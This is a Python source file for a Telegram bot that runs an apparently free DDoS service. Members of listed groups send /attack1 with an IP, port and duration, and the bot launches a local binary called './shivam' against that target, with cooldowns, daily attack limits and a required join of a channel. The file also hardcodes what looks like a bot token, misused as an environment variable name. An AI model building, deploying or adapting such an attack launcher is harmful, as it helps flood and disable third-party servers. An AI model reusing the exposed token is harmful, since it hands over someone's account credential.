import telebot
import datetime
import time
import subprocess
import threading
from keep_alive import keep_alive
import os
from threading import Lock

keep_alive()

# Insert your Telegram bot token here (use environment variables for security)
BOT_TOKEN = os.getenv('7460424277:AAGXaEieWPVeiFauOl_p9zLW3uKVqXJrc8A')
if not BOT_TOKEN:
    raise ValueError("Bot token not set. Please set the TELEGRAM_BOT_TOKEN environment variable.")

bot = telebot.TeleBot(BOT_TOKEN)

# Admin and owner details
admin_id = ["7409754329"]  # List of admin user IDs
owner_id = ["7409754328"]  # List of owner user IDs
OWNER_USERNAME = "@SHIVAMXRAJ"  # Owner username for identification

# Group and channel details
GROUP_IDS = ["-1002410640320", "-1002177231516"]  # Allowed group IDs
CHANNEL_USERNAME = "@GODCRACKSS"  # Channel username for verification

# Default cooldown and attack limits
COOLDOWN_TIME = 150  # Cooldown between attacks in seconds
ATTACK_LIMIT = 10  # Maximum number of attacks per day per user
SPAM_COOLDOWN_TIME = 120  # Cooldown for spamming in seconds
SPAM_THRESHOLD = 3  # Number of spam attempts before penalty
MAX_ATTACK_TIME = 100  # Maximum duration for an attack in seconds

# Files to store user data
USER_FILE = "users.txt"  # File path to save user data persistently

# Dictionary to store user states
user_data = {}  # Tracks user-specific information like attack counts and cooldowns
lock = Lock()  # Thread-safe lock for data access

# Function to load user data from the file
def load_users():
    """Load user data from the specified file into the user_data dictionary."""
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset, spam_cooldown = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None,
                    'spam_count': 0,
                    'spam_cooldown': datetime.datetime.fromisoformat(spam_cooldown) if spam_cooldown != "None" else None
                }
    except FileNotFoundError:
        pass  # Ignore if the file doesn't exist (fresh start)
    except ValueError:
        print("Error parsing users.txt. Check for corrupted data.")

# Function to save user data to the file
def save_users():
    """Save user data from the user_data dictionary to the specified file."""
    with lock:
        with open(USER_FILE, "w") as file:
            for user_id, data in user_data.items():
                spam_cooldown = data['spam_cooldown'].isoformat() if data['spam_cooldown'] else "None"
                file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()},{spam_cooldown}\n")

# Middleware to ensure users are joined to the channel
def is_user_in_channel(user_id):
    """Check if a user is a member of the required channel."""
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except telebot.apihelper.ApiException as e:
        print(f"Error checking channel membership: {e}")
        return False

# Command to handle attacks
@bot.message_handler(commands=['attack1'])
def handle_attack(message):
    """Handle the /attack1 command, enforcing cooldowns and limits."""
    user_id = str(message.from_user.id)

    # Ensure user is in one of the groups
    if str(message.chat.id) not in GROUP_IDS:
        bot.reply_to(message, "This bot can only be used in the specified groups. Join - https://t.me/GODDDOSFREE")
        return

    # Ensure user is a member of the channel
    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"You must join {CHANNEL_USERNAME} to use this bot.")
        return

    with lock:
        # Initialize user data if not present
        if user_id not in user_data:
            user_data[user_id] = {
                'attacks': 0,
                'last_reset': datetime.datetime.now(),
                'last_attack': None,
                'spam_count': 0,
                'spam_cooldown': None
            }

        user = user_data[user_id]

        # Check spam cooldown
        if user['spam_cooldown'] and (datetime.datetime.now() - user['spam_cooldown']).seconds < SPAM_COOLDOWN_TIME:
            remaining_time = SPAM_COOLDOWN_TIME - (datetime.datetime.now() - user['spam_cooldown']).seconds
            bot.reply_to(message, f"You have been penalized for spamming. Wait {remaining_time} seconds.")
            return

        # Check user-specific cooldown
        if user['last_attack'] and (datetime.datetime.now() - user['last_attack']).seconds < COOLDOWN_TIME:
            user['spam_count'] += 1
            remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - user['last_attack']).seconds
            bot.reply_to(message, f"Wait {remaining_time} seconds before attacking again.")

            # If spamming detected, apply penalty
            if user['spam_count'] >= SPAM_THRESHOLD:
                user['spam_cooldown'] = datetime.datetime.now()
                bot.reply_to(message, f"You are temporarily blocked for spamming. Wait {SPAM_COOLDOWN_TIME // 60} minutes.")
            return
        else:
            # Reset spam count if enough time has passed
            user['spam_count'] = 0

        # Check user's daily attack limit
        if user['attacks'] >= ATTACK_LIMIT:
            bot.reply_to(message, f"You have reached your daily attack limit of {ATTACK_LIMIT}. Try again tomorrow.")
            return

        # Parse command arguments
        command = message.text.split()
        if len(command) != 4:
            bot.reply_to(message, "Usage: /attack1 <IP> <PORT> <TIME>")
            return

        target, port, time_duration = command[1], command[2], command[3]

        try:
            port = int(port)  # Validate port as an integer
            time_duration = int(time_duration)  # Validate time duration as an integer
        except ValueError:
            bot.reply_to(message, "Error: PORT and TIME must be integers.")
            return

        if time_duration > MAX_ATTACK_TIME:
            bot.reply_to(message, f"Error: Attack duration cannot exceed {MAX_ATTACK_TIME} seconds.")
            return

        # Safely execute the attack command
        full_command = ["./shivam", target, str(port), str(time_duration), "600"]
        try:
            bot.reply_to(message, f"Attack started on Target: {target}, Port: {port}, Time: {time_duration} seconds.\n"
                                  f"Remaining attacks for you: {ATTACK_LIMIT - user['attacks'] - 1}")
            subprocess.run(full_command, check=True)  # Secure subprocess call
            bot.reply_to(message, f"Attack completed on Target: {target}, Port: {port}, Time: {time_duration} seconds.")
        except subprocess.CalledProcessError as e:
            bot.reply_to(message, f"An error occurred while executing the attack: {str(e)}")
            return

        # Update user data
        user['attacks'] += 1
        user['last_attack'] = datetime.datetime.now()
        save_users()

# Command to display help for users
@bot.message_handler(commands=['help'])
def display_help(message):
    """Provide a list of available commands and their descriptions."""
    help_text = (
        "Available Commands:\n"
        "/attack1 <IP> <PORT> <TIME> - Initiate an attack (subject to cooldowns and limits).\n"
        "/help - Show this help message.\n"
        "Admins Only:\n"
        "/set_time <seconds> - Set the maximum attack duration.\n"
        "/remove_cooldown <user_id> - Remove spam cooldown for a user.\n"
        "/ping - Check the bot's responsiveness (Admins only)."
    )
    bot.reply_to(message, help_text)

# Command to display ping for admins
@bot.message_handler(commands=['ping'])
def display_ping(message):
    """Show the bot's ping only if the user is an admin."""
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "This command is restricted to admins.")
        return

    start_time = time.time()
    bot.reply_to(message, "Pinging...")
    end_time = time.time()
    ping = round((end_time - start_time) * 1000)  # Convert to milliseconds
    bot.reply_to(message, f"Pong! Current ping is {ping} ms.")

# Load user data at startup
load_users()  # Populate user data from the file

# Start the bot
bot.polling(non_stop=True)  # Keep the bot running continuously
